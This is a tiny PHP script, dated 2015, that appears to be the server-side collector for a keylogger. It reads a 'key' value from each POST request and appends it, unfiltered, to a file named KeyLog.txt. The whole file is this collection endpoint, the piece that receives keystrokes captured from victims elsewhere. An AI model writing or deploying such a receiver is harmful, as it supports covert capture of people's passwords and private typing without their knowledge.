<?php
/**
 * Created by PhpStorm.
 * User: wsan
 * Date: 18.04.2015
 * Time: 22:16
 */

    $key=$_POST['key'];
    $logfile="KeyLog.txt";
    $fp = fopen($logfile, "a");
    fwrite($fp, $key);
    fclose($fp);

